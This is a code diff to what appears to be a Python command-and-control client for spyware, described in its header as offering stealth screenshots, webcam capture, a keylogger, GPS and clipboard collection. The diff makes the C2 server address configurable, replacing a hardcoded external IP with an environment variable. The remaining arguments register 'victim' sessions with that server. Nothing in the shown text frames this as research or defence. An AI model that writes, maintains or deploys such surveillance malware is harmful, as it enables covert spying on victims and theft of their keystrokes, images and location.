@@ -6,6 +6,7 @@ All modules: stealth screenshot, webcam, REAL keylogger, GPS, clipboard, system 
 
 import base64
 import json
+import os
 import time
 import threading
 import requests
@@ -455,7 +456,11 @@ class QRDecoder:
 def main():
     import argparse
     parser = argparse.ArgumentParser(description="CyberRecon QR C2 Decoder Client")
-    parser.add_argument("--c2", default="http://11.12.25.98:8443", help="C2 server URL")
+    parser.add_argument(
+        "--c2",
+        default=os.getenv("CYBERRECON_C2", "http://127.0.0.1:8443"),
+        help="C2 server URL (or set CYBERRECON_C2 env var)",
+    )
     parser.add_argument("--victim-id", help="Victim session ID")
     parser.add_argument("--hostname", default="DESKTOP-VICTIM", help="Hostname")
     parser.add_argument("--auto-register", action="store_true", help="Auto-register with C2")
